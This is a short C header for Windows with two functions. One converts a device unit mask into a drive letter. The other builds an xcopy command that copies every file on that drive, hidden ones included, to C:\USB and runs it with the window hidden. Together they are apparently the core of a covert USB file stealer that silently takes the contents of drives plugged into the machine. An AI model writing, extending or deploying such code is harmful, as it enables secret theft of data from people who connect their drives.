#pragma once

#include "resource.h"
CHAR GetDiskLabel(ULONG unitmask) {
	INT i;

	for (i = 0; i < 26; ++i)
	{
		if (1 << i & unitmask)
			break;
	}
	return (CHAR)(0x41 + i);
}

VOID CopyFiles(CHAR diskLabel) {
	CHAR tmp[2] = { 0 };
	CHAR cmd[50] = { 0 };

	tmp[0] = diskLabel;
	strcpy(cmd, "xcopy ");
	strcat(cmd, tmp);
	strcat(cmd, ":\\* /c /y /q /h /e /i C:\\USB");
	WinExec(cmd, SW_HIDE);
}